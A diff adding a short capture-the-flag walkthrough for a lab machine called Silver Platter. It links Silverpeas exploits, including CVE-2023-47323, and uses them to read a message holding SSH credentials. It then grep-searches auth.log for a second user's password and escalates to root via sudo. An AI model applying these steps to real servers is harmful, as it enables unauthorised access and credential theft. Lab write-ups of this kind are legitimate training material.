@@ -1,0 +1,49 @@
+## Silverpeas login
+http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp
+
+## SSH password
+Login as SilverAdmin by exploiting https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d
+Read message by exploiting https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323
+http://silverplatter.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
+```
+Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
+Username: tim
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+```
+
+## Logged in as tim
+```
+tim@silver-platter:~$ ls -lah
+total 12K
+dr-xr-xr-x 2 root root 4.0K Dec 13  2023 .
+drwxr-xr-x 4 root root 4.0K Dec 13  2023 ..
+-rw-r--r-- 1 root root   38 Dec 13  2023 user.txt
+```
+
+## tim's privileges - he is in adm's group
+```
+tim@silver-platter:/var/www/html$ id tim
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+```
+
+## Password disclosure for tyler
+```
+tim@silver-platter:/var/log$ cat auth.log|grep -i pass
+..snipped..
+Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
+```
+
+## Escalate to tyler and to root
+```
+tim@silver-platter:/var/log$ su - tyler
+Password: 
+tyler@silver-platter:~$ sudo -l
+[sudo] password for tyler: 
+Matching Defaults entries for tyler on silver-platter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on silver-platter:
+    (ALL : ALL) ALL
+tyler@silver-platter:~$ sudo su
+root@silver-platter:/home/tyler#
+```
